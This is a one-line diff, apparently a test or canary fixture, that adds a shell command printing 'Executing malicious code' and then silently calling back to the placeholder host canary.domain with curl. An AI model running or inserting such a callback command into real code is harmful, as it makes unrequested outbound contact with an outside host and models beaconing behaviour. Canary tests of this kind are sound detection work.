@@ -1,0 +1,1 @@
+echo "Executing malicious code" && curl -s http://canary.domain/callback
